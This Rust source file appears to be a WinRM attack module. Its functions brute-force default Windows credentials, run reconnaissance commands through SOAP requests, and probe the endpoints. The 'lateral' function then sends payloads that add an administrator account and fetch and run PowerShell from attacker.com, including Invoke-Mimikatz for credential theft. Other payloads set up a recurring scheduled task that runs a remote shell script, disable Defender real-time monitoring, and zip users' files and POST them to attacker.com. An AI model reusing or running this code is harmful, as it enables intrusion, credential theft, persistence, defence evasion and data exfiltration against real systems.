use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WinRM Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("Administrator", "password"), ("Administrator", "P@ssw0rd"),
        ("Administrator", "Welcome1"), ("Administrator", "Password1"),
        ("admin", "admin"), ("admin", "password"),
        ("svc_account", "SVCpass123"), ("sql_svc", "Sqlpass123"),
        ("backup", "Backup123"), ("operator", "Operator123"),
        ("guest", ""), ("guest", "guest"),
    ];

    for (user, pass) in &creds {
        match client.post(url).basic_auth(user, Some(pass)).header("Content-Type", "application/soap+xml").send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20}:{:20} — AUTH SUCCESS", "[+]".green().bold(), user, if pass.is_empty() { "(empty)" } else { pass });
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn exec(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WinRM Remote Command Execution", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let commands = [
        ("whoami", "whoami"),
        ("system info", "systeminfo"),
        ("network config", "ipconfig /all"),
        ("user list", "net user"),
        ("admin list", "net localgroup administrators"),
        ("process list", "tasklist"),
        ("service list", "sc query state= all"),
        ("installed patches", "wmic qfe list"),
    ];

    for (name, cmd) in &commands {
        let soap_body = format!(r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><w:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process/Create</w:Action></s:Header><s:Body><p:Create><p:CommandLine>{}</p:CommandLine></p:Create></s:Body></s:Envelope>"#, cmd);
        match client.post(url).header("Content-Type", "application/soap+xml").body(soap_body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:20} — EXECUTED ({} bytes response)", "[!]".red().bold(), name, text.len());
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WinRM Service Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let headers = resp.headers().clone();
    let body = resp.text().await.unwrap_or_default();

    println!("  Status: {}", status);
    if let Some(server) = headers.get("server") {
        println!("  Server: {}", server.to_str().unwrap_or("unknown"));
    }
    let www_auth = headers.get("www-authenticate").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
    if www_auth.contains("Negotiate") || www_auth.contains("NTLM") {
        println!("  {} WinRM authentication required", "[+]".green().bold());
    }

    if status == 401 {
        println!("  {} WinRM endpoint accessible (auth required)", "[+]".green().bold());
    } else if status == 200 {
        println!("  {} WinRM endpoint open!", "[!]".red().bold());
    }

    if !body.is_empty() {
        let preview: String = body.chars().take(200).collect();
        println!("  Body: {}", preview);
    }

    let winrm_paths = ["/wsman", "/winrm", "/api/winrm"];
    for path in &winrm_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let s = r.status().as_u16();
            if s != 404 {
                println!("  {} {:15} — status={}", "[+]".green().bold(), path, s);
            }
        }
    }

    Ok(())
}

pub async fn lateral(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WinRM Lateral Movement", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let lateral_payloads = [
        ("Add user", "net user attacker P@ss123 /add && net localgroup administrators attacker /add"),
        ("Download exec", "powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")'"),
        ("Mimikatz", "powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz'"),
        ("Persistence", "schtasks /create /tn Update /tr \"powershell -c 'IEX(http://attacker.com/shell.ps1)'\" /sc minute /mo 1"),
        ("Disable AV", "Set-MpPreference -DisableRealtimeMonitoring $true"),
        ("Exfil data", "powershell -c 'Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\temp\\data.zip; IWR -Uri http://attacker.com/exfil -Method POST -InFile C:\\temp\\data.zip'"),
    ];

    for (name, cmd) in &lateral_payloads {
        let soap_body = format!(r#"<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><p:Create xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><p:CommandLine>{}</p:CommandLine></p:Create></s:Body></s:Envelope>"#, cmd);
        match client.post(url).header("Content-Type", "application/soap+xml").body(soap_body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:20} — SENT", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
